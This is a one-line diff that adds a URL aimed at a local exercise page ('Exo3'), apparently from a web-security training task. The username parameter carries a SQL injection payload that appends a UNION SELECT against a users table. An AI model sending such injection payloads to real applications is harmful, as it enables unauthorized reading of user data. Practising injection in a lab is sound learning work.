@@ -1,0 +1,1 @@
+http://localhost/Exo3/?username=aze UNION SELECT 1,2 FROM users WHERE 1=1
